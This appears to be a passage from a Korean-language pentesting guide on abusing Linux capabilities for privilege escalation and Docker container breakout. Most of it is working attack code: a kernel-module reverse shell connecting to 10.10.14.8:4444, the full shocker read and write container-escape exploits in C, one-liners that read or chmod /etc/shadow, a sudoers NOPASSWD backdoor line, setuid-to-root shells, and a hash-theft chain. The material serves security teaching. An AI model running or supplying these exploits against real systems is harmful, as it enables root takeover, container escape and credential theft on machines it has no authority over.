그런 다음 아래에서 찾을 수 있는 2개의 예시를 사용하여 **kernel module**을 compile하고 이 폴더에 복사하세요:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
마지막으로, 이 kernel module을 로드하는 데 필요한 python code를 실행합니다:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binary를 사용한 예제 2**

다음 예제에서 **`kmod`** binary에는 다음 capability가 있습니다.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
이는 **`insmod`** 명령을 사용하여 kernel module을 삽입할 수 있다는 의미입니다. 아래 예제를 따라 이 권한을 악용하여 **reverse shell**을 획득하세요.

**환경을 사용한 예제(Docker breakout)**

다음 명령을 사용하여 Docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **SYS_MODULE** capability가 활성화된 것을 확인할 수 있습니다.<sup>[[14]](#references)</sup>

**reverse shell**을 실행할 **kernel module**과 이를 **compile**하기 위한 **Makefile**을 **생성**합니다:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile의 각 make 단어 앞에 있는 공백 문자는 스페이스가 아닌 탭이어야 합니다!

`make`를 실행하여 컴파일합니다.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
마지막으로 shell 내부에서 `nc`를 시작한 다음 다른 shell에서 **모듈을 load**하면 nc 프로세스에서 shell을 캡처하게 됩니다:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**이 technique의 code는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)의 **"Abusing SYS_MODULE Capability" laboratory에서 복사되었습니다.**<sup>[[1]](#references)</sup>

이 technique의 또 다른 예시는 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)에서 확인할 수 있습니다.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 process가 **파일을 읽고 directory를 읽고 실행하기 위한 permissions를 우회**할 수 있도록 합니다. 주요 용도는 파일 검색 또는 읽기입니다. 그러나 process가 process의 mount namespace 외부에 있는 파일을 포함하여 모든 파일에 접근할 수 있는 `open_by_handle_at(2)` function을 사용할 수도 있도록 합니다. `open_by_handle_at(2)`에서 사용되는 handle은 `name_to_handle_at(2)`를 통해 얻는 non-transparent identifier여야 하지만, 변조에 취약한 inode number와 같은 민감한 information을 포함할 수 있습니다. 이 capability의 exploitation 가능성은 특히 Docker container 환경에서 Sebastian Krahmer가 shocker exploit을 통해 입증했으며, [여기](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 분석되었습니다.<sup>[[12]](#references)[[13]](#references)</sup>
**이는 파일 read permission checks와 directory read/execute permission checks를 우회할 수 있다는 의미입니다**.<sup>[[14]](#references)</sup>

**binary를 사용한 예시**

binary는 해당 binary의 namespaces에서 접근할 수 있는 파일을 읽을 수 있습니다. 따라서 `tar`와 같은 파일에 이 capability가 있으면 shadow file을 읽을 수 있습니다:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 예시**

이 경우 **`python`** binary에 이 capability가 있다고 가정해 보겠습니다. root files를 나열하려면 다음을 실행할 수 있습니다:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
그리고 파일을 읽으려면 다음과 같이 할 수 있습니다:
```python
print(open("/etc/shadow", "r").read())
```
**환경에서의 예시 (Docker breakout)**

`capsh --print`를 사용하여 Docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **DAC_READ_SEARCH** capability가 활성화된 것을 확인할 수 있습니다. 이는 DAC read/search 검사를 우회하고 `open_by_handle_at(2)`를 사용할 수 있도록 하며, 그 자체로 process-debugging capability인 것은 아닙니다.<sup>[[14]](#references)</sup>

다음 exploit이 어떻게 작동하는지는 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 확인할 수 있습니다. 간단히 말해, **CAP_DAC_READ_SEARCH**는 permission checks 없이 file system을 탐색할 수 있도록 하며 `open_by_handle_at(2)`를 사용할 수 있게 합니다. 이를 통해 관련 namespaces와 mounts에 접근할 수 있는 경우 다른 processes가 연 files가 노출될 수 있습니다.<sup>[[13]](#references)[[14]](#references)</sup>

이 permissions를 악용해 host에서 files를 읽는 original exploit은 여기에서 확인할 수 있습니다: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); 다음은 **read할 file을 first argument로 전달하고 결과를 file에 dump할 수 있도록 수정된 version**입니다.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit은 host에 mount된 무언가에 대한 pointer를 찾아야 합니다. 원래 exploit은 파일 /.dockerinit를 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. exploit이 작동하지 않는다면 다른 파일을 설정해야 할 수 있습니다. host에 mount된 파일을 찾으려면 mount command를 실행하면 됩니다:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit은 host에 mount된 무언가에 대한 pointer를 찾아야 합니다. 원래 exploit은 파일 /.dockerinit를 사용했으며, 이 수정된 버전은...](<../../images/image (407) (1).png>)

**이 technique의 code는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)**의 "Abusing DAC_READ_SEARCH Capability" laboratory에서 복사되었습니다.**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**이 capability는 file read, write 및 execute permission check를 우회합니다.**<sup>[[14]](#references)</sup>

privileged group의 membership을 통해 readable 또는 writable해지는 파일을 찾으세요. 유용한 target은 target의 ownership 및 mode bits에 따라 달라집니다.<sup>[[14]](#references)</sup>

**binary 예시**

이 예시에서는 vim에 이 capability가 있으므로 _passwd_, _sudoers_ 또는 _shadow_와 같은 모든 파일을 수정할 수 있습니다:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**binary 2를 사용한 예시**

이 예시에서는 **`python`** 바이너리가 이 capability를 갖게 됩니다. python을 사용하여 모든 파일을 덮어쓸 수 있습니다:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**environment + CAP_DAC_READ_SEARCH를 사용한 예시 (Docker breakout)**

앞의 `CAP_DAC_READ_SEARCH` environment 예시에서 설명한 것처럼 `capsh --print`를 사용하여 `CAP_DAC_OVERRIDE`를 확인합니다.<sup>[[14]](#references)[[26]](#references)</sup>

먼저 호스트의 **임의의 파일을 읽기 위해 DAC_READ_SEARCH capability를 악용하는** [**이전 섹션**](linux-capabilities.md#cap_dac_read_search)을 읽고 exploit을 **compile**합니다.\
그런 다음 호스트 filesystem 내부에 **임의의 파일을 write**할 수 있도록 해 주는 **다음 버전의 shocker exploit을 compile**합니다:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker container에서 **탈출**하려면 호스트에서 `/etc/shadow` 및 `/etc/passwd` 파일을 **다운로드**하고, 여기에 **새 사용자**를 **추가**한 다음 `shocker_write`를 사용하여 해당 파일을 덮어쓸 수 있습니다. 그런 다음 **ssh**를 통해 **접근**합니다.

**이 technique의 코드는** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)의 **"Abusing DAC_OVERRIDE Capability" laboratory에서 복사되었습니다.**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**이 capability를 사용하면 process가 파일의 ownership을 변경할 수 있습니다.**<sup>[[14]](#references)</sup>

**binary를 사용한 예시**

**`python`** binary에 이 capability가 있다고 가정해 보겠습니다. 파일의 owner를 **`shadow`**와 같이 변경한 다음, 다른 permissions가 허용하는 경우 resulting access를 사용하여 파일을 수정할 수 있습니다:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
또는 이 capability가 설정된 **`ruby`** binary를 사용하여:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**이 capability는 권한 변경을 포함한 여러 파일 작업에서 소유권 검사를 우회합니다**.<sup>[[14]](#references)</sup>

**binary를 사용한 예시**

Python에 이 capability가 있으면 shadow 파일의 권한을 수정하고, **root password를 변경**한 다음 privileges를 escalate할 수 있습니다:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**이 capability를 사용하면 kernel이 적용하는 credential 및 capability 규칙에 따라 process가 자신의 effective user ID를 변경할 수 있습니다**.<sup>[[14]](#references)</sup>

**binary 예시**

python에 이 **capability**가 있으면 이를 매우 쉽게 악용하여 root로 privileges를 escalate할 수 있습니다:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**또 다른 방법:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**이 capability를 사용하면 kernel이 적용하는 credential 및 capability 규칙에 따라 process가 effective group ID를 변경할 수 있습니다**.<sup>[[14]](#references)</sup>

**privilege를 escalate하기 위해 overwrite할 수 있는 file이 많이 있으며,** [**여기에서 아이디어를 얻을 수 있습니다**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**binary를 사용한 예시**

이 경우 어떤 group이든 impersonate할 수 있으므로 group이 read할 수 있는 interesting file을 찾아야 합니다:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
권한 상승을 위해 악용할 수 있는 파일(읽기 또는 쓰기를 통해)을 찾았다면 다음을 사용해 **interesting group**을 가장하는 shell을 얻을 수 있습니다:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
이 경우 `shadow` 그룹으로 가장하여 `/etc/shadow` 파일을 읽을 수 있습니다:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

두 capability가 동일한 helper에서 모두 사용 가능한 경우, 실용적인 chain은 다음과 같습니다:

1. EGID를 `shadow`(또는 다른 privileged group)로 전환합니다.
2. `shadow` group을 유지하면서 UID를 설정하도록 `/etc/shadow`에 `chown`을 사용합니다.
3. target hash를 읽고 crack/pivot합니다.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
이는 직접 full root 권한이 필요하지 않게 하며, credential reuse를 통해 pivot하는 데 흔히 충분합니다.

**docker**가 설치되어 있다면 **docker group**을 **impersonate**하고 이를 abuse하여 [**docker socket**과 통신해 권한을 escalate](#writable-docker-socket)할 수 있습니다.

## CAP_SETFCAP

**이 capability를 사용하면 프로세스가 file capabilities를 설정할 수 있습니다**.<sup>[[14]](#references)</sup>

**바이너리를 사용한 예제**

python에 이 **capability**가 있다면 이를 매우 쉽게 abuse하여 root 권한으로 escalate할 수 있습니다:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> 새로 작성된 파일의 capability set은 이전 set을 대체합니다. 따라서 helper가 새 capability만 사용하여 실행되면 다른 파일을 업데이트하는 데 필요한 `CAP_SETFCAP`을 더 이상 유지하지 못할 수 있습니다.<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid)을 획득하면 해당 section으로 이동하여 privileges를 escalate하는 방법을 확인할 수 있습니다.

**environment를 사용한 Example (Docker breakout)**

Docker에 문서화된 기본 capability set에는 **CAP_SETFCAP**이 포함되지만, 실제 set은 runtime configuration에 따라 달라집니다.<sup>[[19]](#references)</sup>
다음 명령으로 process capabilities를 확인할 수 있습니다:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
이 capability는 file capabilities를 작성할 수 있도록 하지만, 그 자체로 현재 process에 해당 capability를 부여하거나 파일이 실행될 때 적용되는 file, bounding-set 및 namespace 규칙을 우회하지는 않습니다.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
파일에 허용된 capabilities는 프로세스의 capability bounding set에 의해 제한되며, 파일의 effective bit는 파일의 permitted set이 프로세스의 effective set으로 승격될지 여부를 제어합니다. 따라서 파일에 capabilities를 추가해도 실행 시 요청된 모든 capability를 자동으로 사용할 수 있게 되는 것은 아닙니다.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 접근, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` system call 접근, 다양한 디스크 명령을 포함한 여러 민감한 작업을 제공합니다. `FIBMAP ioctl(2)`도 이 capability를 통해 활성화되며, 이로 인해 [과거](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)에 문제가 발생한 적이 있습니다. man page에 따르면, 이 capability의 보유자는 다른 장치에서 장치별 작업을 다양한 방식으로 수행할 수도 있습니다.<sup>[[14]](#references)</sup>

이는 **privilege escalation** 및 **Docker breakout**에 유용할 수 있습니다.<sup>[[14]](#references)</sup>

## CAP_KILL

**이 capability는 kernel이 정의한 경우에 프로세스에 signal을 보내기 위한 permission check를 우회합니다**.<sup>[[14]](#references)</sup>

**binary 예시**

**`python`** binary에 이 capability가 있다고 가정해 보겠습니다. **일부 service 또는 socket configuration** 파일(또는 service와 관련된 configuration file)을 수정할 수도 있다면, 해당 파일에 backdoor를 삽입한 다음 service와 관련된 프로세스를 kill하고 새로운 configuration file이 backdoor와 함께 실행될 때까지 기다릴 수 있습니다.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

kill capabilities가 있고 **root로 실행 중인 node program**(또는 다른 사용자로 실행 중인 프로그램)이 있다면, 해당 프로그램에 **SIGUSR1 시그널을 보낼 수 있고**, 이를 통해 **node debugger를 열게 하여** 연결할 수 있을 가능성이 높습니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**이 capability는 1024 미만의 Internet port에 bind할 수 있도록 합니다.** 더 광범위한 privilege escalation을 직접 부여하지는 않습니다.<sup>[[14]](#references)</sup>

**바이너리를 사용한 예시**

**`python`**에 이 capability가 있으면 모든 port에서 listen할 수 있으며, 해당 port를 통해 다른 모든 port로 connect할 수도 있습니다 (일부 service는 특정 privilege port에서의 connection을 요구합니다).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 프로세스가 **RAW 및 PACKET sockets를 생성**할 수 있도록 하여 임의의 network packets를 생성하고 전송할 수 있게 합니다. 이는 packet spoofing, traffic injection, network access controls 우회와 같은 containerized environments의 security risks로 이어질 수 있습니다. 악의적인 actors는 이를 악용하여 container routing을 방해하거나 host network security를 침해할 수 있으며, 특히 적절한 firewall protections가 없는 경우 더욱 위험합니다. 또한 **CAP_NET_RAW**는 RAW ICMP requests를 통한 ping과 같은 작업을 지원합니다.<sup>[[14]](#references)</sup>

**이는 적절한 socket interface를 사용하여 packet capture를 가능하게 합니다.** broader privilege escalation을 직접 부여하지는 않습니다.<sup>[[14]](#references)</sup>

**binary를 사용한 예시**

binary **`tcpdump`**에 이 capability가 있으면 이를 사용하여 network information을 capture할 수 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
If **environment**가 이 capability를 부여하면, **`tcpdump`**도 이를 사용해 traffic을 sniff할 수 있습니다.<sup>[[14]](#references)</sup>

**binary 2를 사용한 예시**

다음 예시는 "**lo**" (**localhost**) interface의 traffic을 intercept하는 데 유용한 **`python2`** code입니다. 이 code는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)의 "_The Basics: CAP-NET_BIND + NET_RAW_" lab에서 가져온 것입니다.<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 노출된 network namespaces 내에서 firewall 설정, routing tables, socket permissions 및 network interface 설정을 포함한 **network configurations를 변경**할 수 있는 권한을 보유자에게 부여합니다. 또한 network interfaces에서 **promiscuous mode**를 활성화하여 namespaces 전반의 packet sniffing을 가능하게 합니다.<sup>[[14]](#references)</sup>

**binary 예시**

**python binary**에 이러한 capabilities가 있다고 가정해 보겠습니다.
